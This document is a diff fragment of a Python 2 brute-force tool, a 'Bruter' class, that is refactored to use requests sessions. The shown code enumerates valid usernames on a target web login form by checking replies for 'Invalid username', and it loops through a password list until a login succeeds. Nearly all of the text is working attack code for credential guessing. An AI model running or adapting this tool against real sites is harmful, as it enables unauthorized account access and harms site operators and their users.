@@ -64,8 +64,6 @@ class Bruter(object):
         #loop until end of password list or until password found
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
-            #creating a cookielib object to handle the cookies
-            #cookie will be store in the file "cookies"
 
             #we use a session object here, so it handles the cookies for us
             session = requests.Session()
@@ -129,12 +127,10 @@ class Bruter(object):
         while not self.username_q.empty():
             brute = self.username_q.get().rstrip()
 
-            #creating a cookielib object to handle the cookies
-            #cookie will be store in the file "cookies"
-            jar = cookielib.FileCookieJar("cookies")
-            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
-            response = opener.open(self.target_url)
-            page = response.read()
+            #we use a session object here, so it handles the cookies for us
+            session = requests.Session()
+            response = session.get(self.target_url)
+            page = response.text
 
             print "Trying: %s (%d left)" % (brute, self.username_q.qsize())
             
@@ -165,10 +161,8 @@ class Bruter(object):
             # add our username and password fields
             post_tags[self.username_field] = brute
             post_tags[self.password_field] = self.unprobable_password
-            login_data = urllib.urlencode(post_tags)
-            login_response = opener.open(self.target_post, login_data)
-            login_result = login_response.read()
-            #print(login_result)
+            login_response = session.post(self.target_post, data=post_tags)
+            login_result = login_response.text
 
             if not "Invalid username" in login_result:
                 print("Username %s is valid" %brute)
